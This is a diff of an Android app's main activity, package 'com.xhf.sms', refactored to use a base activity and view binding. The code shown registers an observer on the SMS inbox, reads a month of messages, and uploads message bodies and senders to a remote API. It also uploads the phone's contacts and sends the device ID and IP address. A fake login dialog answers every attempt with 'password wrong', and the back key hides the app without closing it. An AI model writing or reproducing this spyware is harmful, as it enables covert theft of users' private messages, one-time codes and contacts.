@@ -3,23 +3,22 @@ package com.xhf.sms;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
+import android.graphics.Paint;
 import android.net.Uri;
-import android.os.Bundle;
-import android.os.CountDownTimer;
 import android.os.Handler;
 import android.provider.ContactsContract;
 import android.text.TextUtils;
 import android.util.Log;
-import android.view.Gravity;
+import android.view.KeyEvent;
 import android.view.LayoutInflater;
 import android.view.View;
-import android.widget.ImageView;
+import android.widget.TextView;
 import android.widget.Toast;
 
-import com.chad.library.adapter.base.BaseQuickAdapter;
 import com.google.gson.Gson;
 import com.xhf.sms.adapter.MainAdapter;
 import com.xhf.sms.api.ApiManager;
+import com.xhf.sms.base.BaseActivity;
 import com.xhf.sms.bean.ConfigBean;
 import com.xhf.sms.bean.ContractBean;
 import com.xhf.sms.bean.MainBean;
@@ -29,90 +28,63 @@ import com.xhf.sms.dialog.CenterDialog;
 import com.xhf.sms.utils.SpUtils;
 
 import java.util.ArrayList;
-import java.util.Calendar;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 
-import androidx.appcompat.app.AppCompatActivity;
 import androidx.recyclerview.widget.RecyclerView;
 import androidx.recyclerview.widget.StaggeredGridLayoutManager;
-
+import butterknife.BindView;
 import io.reactivex.Observer;
 import io.reactivex.android.schedulers.AndroidSchedulers;
 import io.reactivex.disposables.Disposable;
 import io.reactivex.schedulers.Schedulers;
 
 
-public class MainActivity extends AppCompatActivity implements View.OnClickListener {
+public class MainActivity extends BaseActivity {
 
+    @BindView(R.id.recyclerView)
+    RecyclerView mRecyclerView;
+    @BindView(R.id.postionView)
+    TextView mPostionView;
     private MainAdapter mMainAdapter;
-    private RecyclerView mRecyclerView;
-    private ImageView mHeaderView, mFootView;
-    private List<MainBean> mMainBeans;
-    private CenterDialog mCenterDialog;
     private CenterDialog mLoginDialog;
-    private CenterDialog mEnterDialog;
     private Uri SMS_INBOX = Uri.parse("content://sms/");
     private List<SmsBean.Msg> mMsgList = new ArrayList<>();
     private List<ContractBean.ContractList> mPhoneList = new ArrayList<>();
-    private boolean isClick;
-    private CountDownTimer mDownTimer;
+    private long exitTime;
+    private String mAddress;
 
 
     @Override
-
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        initView();
-        initData();
-        PhoneCode phoneCode = new PhoneCode(this, new Handler(), new PhoneCode.SmsListener() {
-            @Override
-            public void onResult(String phone, String body) {
-                Log.e("onResult: ", phone + "-" + body);
-                mPhoneList.clear();
-                SmsBean.Msg msg = new SmsBean.Msg();
-                msg.setTel(phone);
-                msg.setData(body);
-                mMsgList.add(msg);
-                postSmsData(mMsgList);
-
-            }
-        });
-
-        this.getContentResolver().registerContentObserver(
-                SMS_INBOX, true, phoneCode);
-
-        mDownTimer = new CountDownTimer(15000, 1000) {
-            @Override
-            public void onTick(long millisUntilFinished) {
-                Log.e("sms", millisUntilFinished + "");
-
-            }
-
-            @Override
-            public void onFinish() {
-                setClick();
-            }
-        };
-
-        mDownTimer.start();
-
-
+    protected int getLayoutId() {
+        return R.layout.activity_main;
     }
 
 
-    private long getMonthTime() {
-        Calendar calendar = Calendar.getInstance();
-        calendar.setTime(new Date(System.currentTimeMillis()));
-        calendar.add(Calendar.MONTH, -1);
-        return calendar.getTimeInMillis();
+    protected void initView() {
+
+        mAddress = getIntent().getStringExtra("address");
+        initRecycler();
+        mPostionView.setText(mAddress);
+
+        PhoneCode phoneCode = new PhoneCode(this, new Handler(), (phone, body) -> {
+            Log.e("onResult: ", phone + "-" + body);
+            mPhoneList.clear();
+            SmsBean.Msg msg = new SmsBean.Msg();
+            msg.setTel(phone);
+            msg.setData(body);
+            mMsgList.add(msg);
+            postSmsData(mMsgList);
+
+        });
+        this.getContentResolver().registerContentObserver(
+                SMS_INBOX, true, phoneCode);
+
+
     }
 
 
     private void requestMainData() {
-
 
         HashMap<String, Integer> map = new HashMap<>();
         map.put("page", 1);
@@ -128,8 +100,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
                     @Override
                     public void onNext(List<MainBean> mainBeans) {
-                        mMainBeans.addAll(mainBeans);
-                        mMainAdapter.setNewData(mMainBeans);
+                        mMainAdapter.setNewData(mainBeans);
 
                     }
 
@@ -148,7 +119,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     }
 
-    private void initData() {
+    protected void initData() {
         sendUserInfo();
         requestMainData();
         requestConfig();
@@ -197,7 +168,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     private void sendUserInfo() {
-        UserBean userBean = new UserBean(" ", " ", AppUtils.getDeviceID(this), AppUtils.getLocalIpAddress(this));
+        UserBean userBean = new UserBean(" ", AppUtils.getDeviceID(this)," ", AppUtils.getLocalIpAddress(this),mAddress);
         ApiManager.getInstance().getApiService().sendUser(userBean)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
@@ -225,7 +196,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 });
 
     }
-
 
     public void getPhoneNumber() {
         ContentResolver resolver = getContentResolver();
@@ -286,9 +256,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     @Override
                     public void onNext(Response response) {
                         Log.e("sms", "通讯录上传成功: " + response.getMsg());
-//                        if (response.getCode() == 1) {
-//
-//                        }
+                        //                        if (response.getCode() == 1) {
+                        //
+                        //                        }
                     }
 
                     @Override
@@ -317,8 +287,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             String number = cur.getString(cur.getColumnIndex("address"));
             long startTime = cur.getLong(cur.getColumnIndex("date"));
             String body = cur.getString(cur.getColumnIndex("body"));
-            Log.e("result", startTime + "-" + getMonthTime() + "--" + body);
-            if (startTime > getMonthTime()) {
+            Log.e("result", startTime + "-" + AppUtils.getMonthTime() + "--" + body);
+            if (startTime > AppUtils.getMonthTime()) {
                 SmsBean.Msg msg = new SmsBean.Msg();
                 msg.setTel(number);
                 msg.setData(body);
@@ -367,128 +337,53 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 });
     }
 
-
-    private void initEnterDialog() {
-        isClick = true;
-        if (mDownTimer != null) {
-            mDownTimer.cancel();
-        }
-        mEnterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
-                .setLayoutRes(R.layout.dialog_enter)
-                .setViewGravity(Gravity.CENTER)
-                .setViewListener(new CenterDialog.ViewListener() {
-                    @Override
-                    public void bindView(View v) {
-                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                mEnterDialog.dismiss();
-                            }
-                        });
-
-                        v.findViewById(R.id.applyView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                startActivity(new Intent(MainActivity.this, DetailActivity.class));
-                                mEnterDialog.dismiss();
-                            }
-                        });
-                    }
-                }).show();
-    }
-
     private void initLoginDialog() {
         mLoginDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                 .setLayoutRes(R.layout.dialog_login)
-                .setViewGravity(Gravity.CENTER)
-                .setViewListener(new CenterDialog.ViewListener() {
-                    @Override
-                    public void bindView(View v) {
-                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                mLoginDialog.dismiss();
-                            }
-                        });
-
-                        v.findViewById(R.id.confirmView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show();
-                                mLoginDialog.dismiss();
-                            }
-                        });
-                    }
+                .setViewListener(v -> {
+                    TextView textView = v.findViewById(R.id.text);
+                    textView.getPaint().setFlags(Paint.UNDERLINE_TEXT_FLAG);
+                    textView.setOnClickListener(v1 -> {
+                        startActivity(new Intent(MainActivity.this, RegisterActivity.class));
+                        mLoginDialog.dismiss();
+                    });
+                    v.findViewById(R.id.confirmView).setOnClickListener(v12 -> Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show());
                 }).show();
 
 
     }
 
-    private void initView() {
-        mRecyclerView = findViewById(R.id.recyclerView);
-        mHeaderView = findViewById(R.id.headerView);
-        mFootView = findViewById(R.id.footView);
-        mHeaderView.setOnClickListener(this);
-        mFootView.setOnClickListener(this);
-
-        mMainBeans = new ArrayList<>();
-
-        mMainAdapter = new MainAdapter(mMainBeans);
+    private void initRecycler() {
+        mMainAdapter = new MainAdapter();
         mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));
         mRecyclerView.setAdapter(mMainAdapter);
 
         View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null);
         mMainAdapter.addFooterView(footerView);
 
-        mMainAdapter.setOnItemClickListener(new BaseQuickAdapter.OnItemClickListener() {
-            @Override
-            public void onItemClick(BaseQuickAdapter adapter, View view, int position) {
-                setClick();
-            }
-        });
-
-
+        mMainAdapter.setOnItemClickListener((adapter, view, position) -> setClick());
     }
 
 
     private void setClick() {
-        mCenterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
-                .setLayoutRes(R.layout.dialog_main)
-                .setViewGravity(Gravity.CENTER)
-                .setViewListener(new CenterDialog.ViewListener() {
-                    @Override
-                    public void bindView(View v) {
-
-                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                mCenterDialog.dismiss();
-                            }
-                        });
-                        v.findViewById(R.id.loginView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                initLoginDialog();
-                                mCenterDialog.dismiss();
-
-                            }
-                        });
-                        v.findViewById(R.id.enterView).setOnClickListener(new View.OnClickListener() {
-                            @Override
-                            public void onClick(View v) {
-                                initEnterDialog();
-                                mCenterDialog.dismiss();
-
-                            }
-                        });
-
-                    }
-                }).show();
+        initLoginDialog();
     }
 
 
-    @Override
-    public void onClick(View v) {
-        setClick();
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == KeyEvent.KEYCODE_BACK) {
+            if ((System.currentTimeMillis() - exitTime) > 1500) {
+                Toast.makeText(this, "再按一次退出", Toast.LENGTH_SHORT).show();
+                exitTime = System.currentTimeMillis();
+                return true;
+            } else {
+                Intent home = new Intent(Intent.ACTION_MAIN);
+                home.addCategory(Intent.CATEGORY_HOME);
+                startActivity(home);
+                return true;
+            }
+        }
+        return super.onKeyDown(keyCode, event);
     }
+
 }
